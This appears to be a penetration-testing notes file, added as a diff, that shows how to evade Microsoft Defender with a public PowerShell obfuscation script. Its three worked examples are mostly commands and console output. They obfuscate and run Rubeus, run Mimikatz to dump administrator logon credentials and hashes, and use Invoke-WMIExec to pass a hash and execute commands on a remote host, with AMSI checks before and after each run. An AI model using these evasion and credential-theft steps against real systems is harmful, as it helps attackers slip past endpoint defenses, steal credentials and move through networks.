@@ -1,0 +1,208 @@
+==================================================================================================================================================
+AV bypass using the PowerShell obfuscation script 'Powershell-Obfuscation.ps1'
+==================================================================================================================================================
+
+=> Source: https://github.com/H4de5-7/powershell-obfuscation
+
+It is a simple but very effective PowerShell obfuscation script designed to bypass Antivirus solutions.
+          
+The script uses multiple techniques to evade common AV detection methods such as:
+> a custom encryption and decryption function with several iterations of encryption / decryption,
+> AMSI bypass, 
+> ETW-block,
+> powershell command obfuscation.
+
+
+==================================================================================================================================================
+Example 1 - Obfuscate/encrypt the script 'Invoke-Rubeus.ps1' and then run it on a Windows 10 laptop which is fully patched with the MS Defender
+            AV enabled and up-to-date
+==================================================================================================================================================
+
+PS C:\temp> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+PS C:\temp> .\Powershell-obfuscation.ps1 -f C:\Users\Administrator.Laptop1\Documents\Tools-AD\Invoke-Rubeus.ps1
+[+] obfuscation result has been saved in bypass.ps1
+
+PS C:\temp> ls .\bypass.ps1
+
+    Directory: C:\temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        22/12/2022     07:46        1328436 bypass.ps1
+
+PS C:\temp> type bypass.ps1
+[Byte[]]$c = [System.Convert]::FromBase64String('AXQBICAZFxkfa2BjZ0olW2VYZGRmOhs...<SNIP>
+
+PS C:\temp> . .\bypass.ps1
+
+PS C:\temp> invoke-rubeus
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4
+
+
+ Ticket requests and renewals:
+
+    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec]
+
+    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec]
+
+    Retrieve a TGT using a PCKS12 certificate, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER /certificate:C:\temp\leaked.pfx </password:STOREPASSWORD> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
+
+    Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
+
+    Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
+        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/usesvcdomain]
+
+    Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:
+        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]
+
+    Perform a Kerberos-based password bruteforcing attack:
+        Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]
+
+<SNIP>
+
+PS C:\temp> amsiscanbuffer
+amsiscanbuffer : The term 'amsiscanbuffer' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a
+path was included, verify that the path is correct and try again.
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (amsiscanbuffer:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+
+==================================================================================================================================================
+Example 2 - Obfuscate/encrypt the script 'Invoke-Mimikatz.ps1' (custom version) and then run it on a Windows 10 laptop which is fully patched 
+            with the Microsoft Defender AV enabled and up-to-date
+==================================================================================================================================================
+
+C:\Users\Administrator.Laptop1>powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Administrator> cd C:\temp
+
+PS C:\temp> ls
+
+    Directory: C:\temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        22/12/2022     05:26           2969 Powershell-obfuscation.ps1
+
+
+PS C:\temp> amsiscanbuffer
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+
+PS C:\temp> .\Powershell-obfuscation.ps1 -f C:\Users\Administrator.Laptop1\Documents\Tools-AD\Invoke-Mimi-Custom.ps1
+[+] obfuscation result has been saved in bypass.ps1
+
+PS C:\temp> . .\bypass.ps1
+
+PS C:\temp> invoke-mimi-custom
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 97707473 (00000000:05d2e5d1)
+Session           : Interactive from 3
+User Name         : Administrator
+Domain            : Laptop1
+Logon Server      : Laptop1
+Logon Time        : 21/12/2022 22:42:34
+SID               : S-1-5-21-936125016-2310263949-2175806047-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : Laptop1
+         * NTLM     : 36f7a3ebaa54935ecf03678e1<SNIP>
+         * SHA1     : d5feabcececab0e16c2cbb391<SNIP>
+        tspkg :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : <SNIP>
+        wdigest :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+		
+
+==================================================================================================================================================
+Example 3 - Obfuscate/encrypt the script 'Invoke-WMIExec.ps1' and then run it on a Windows 10 laptop which is fully patched with the Microsoft 
+            Defender AV enabled and up-to-date
+==================================================================================================================================================
+
+PS C:\temp> amsiscanbuffer
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+    
+PS C:\temp> .\Powershell-obfuscation.ps1 -f C:\Users\Administrator\Documents\Tools-AD\Invoke-WMIExec.ps1
+[+] obfuscation result has been saved in bypass.ps1
+
+PS C:\temp> . .\bypass.ps1
+
+PS C:\temp> Invoke-WMIExec -Target 192.168.1.51 -Domain . -Username administrator -Hash cf3a5525ee9414229e662796<SNIP> -verbose
+VERBOSE: Connecting to 192.168.1.51:135
+VERBOSE: WMI reports target hostname as Oracleserver1
+.\administrator accessed WMI on 192.168.1.51
+
+
+PS C:\temp> Invoke-WMIExec -Target 192.168.1.51 -Domain . -Username administrator -Hash cf3a5525ee9414229e662796<SNIP> -Command "cmd /c echo audit > C:\temp\audit.txt" -verbose
+VERBOSE: Connecting to 192.168.1.51:135
+VERBOSE: WMI reports target hostname as Oracleserver1
+VERBOSE: .\administrator accessed WMI on 192.168.1.51
+VERBOSE: Using Oracleserver1 for random port extraction
+VERBOSE: Connecting to 192.168.1.51:49666
+VERBOSE: Attempting command execution
+Command executed with process ID 1380 on 192.168.1.51
+
+
+PS C:\temp> amsiscanbuffer
+amsiscanbuffer : The term 'amsiscanbuffer' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a
+path was included, verify that the path is correct and try again.
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (amsiscanbuffer:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
